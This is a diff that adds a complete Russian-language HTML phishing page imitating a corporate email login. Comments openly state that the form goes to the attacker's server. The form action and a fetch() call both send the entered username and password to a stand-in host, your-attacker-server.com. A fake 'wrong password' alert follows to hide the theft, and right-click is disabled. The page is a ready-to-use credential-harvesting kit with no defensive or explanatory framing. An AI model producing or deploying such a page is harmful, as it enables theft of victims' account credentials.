@@ -1,0 +1,217 @@
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в аккаунт - Корпоративная почта</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 350px;
+            padding: 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo h1 {
+            font-size: 24px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #757575;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #2979ff;
+            box-shadow: 0 0 5px rgba(41, 121, 255, 0.3);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #2979ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background-color: #2968ff;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot-password a {
+            color: #2979ff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* Скрытое поле для передачи данных */
+        input[type="hidden"] {
+            display: none;
+        }
+
+        .alert-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">
+        <!-- Здесь можно разместить логотип компании -->
+        <h1>Корпоративная почта</h1>
+    </div>
+    
+    <p class="subtitle">Введите свои данные для входа в систему</p>
+
+    <div id="alert" class="alert-message"></div>
+
+    <!-- Форму отправляем на сервер атакующего -->
+    <form action="https://your-attacker-server.com/login.php" method="POST" id="loginForm">
+        <input type="hidden" name="source" value="phishing_page_v1">
+        
+        <div class="form-group">
+            <label for="username">Имя пользователя или Email</label>
+            <input type="text" id="username" name="username" required autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" required autocomplete="off">
+        </div>
+
+<!-- Дополнительное скрытое поле для отслеживания -->
+        <input type="hidden" name="timestamp" id="ts">
+        
+        <button type="submit" class="login-btn">Войти</button>
+    </form>
+
+    <div class="forgot-password">
+        <a href="#" onclick="alert('Ссылка на восстановление пароля'); return false;">Забыли пароль?</a>
+    </div>
+
+    <p class="footer-note">&copy; 2023 Корпоративная сеть. Все права защищены.</p>
+</div>
+
+<script>
+    // Заполняем таймстемп при загрузке страницы
+    document.getElementById('ts').value = new Date().toISOString();
+
+    const form = document.getElementById('loginForm');
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Имитация загрузки для реалистичности
+        const btn = this.querySelector('.login-btn');
+        btn.textContent = 'Проверка...';
+        btn.disabled = true;
+
+        // Отправляем данные асинхронно (или можно просто отправить форму)
+        fetch('https://your-attacker-server.com/login.php', {
+            method: 'POST',
+            body: new FormData(form),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            // После успешной отправки можно редиректить на настоящий сайт или показать сообщение об ошибке
+            setTimeout(() => {
+                alert('Неверное имя пользователя или пароль. Попробуйте еще раз.');
+                btn.textContent = 'Войти';
+                btn.disabled = false;
+                
+                // Опционально: очистка полей
+                document.getElementById('password').value = '';
+            }, 1500);
+        })
+        .catch(error => {
+            console.error('Ошибка:', error);
+            alert('Произошла ошибка. Попробуйте позже.');
+            btn.textContent = 'Войти';
+            btn.disabled = false;
+        });
+    });
+
+    // Простая защита от копирования (опционально, для большей "реалистичности" или наоборот)
+    document.body.oncontextmenu = function() { return false; } 
+</script>
+
+</body>
+</html>
+```
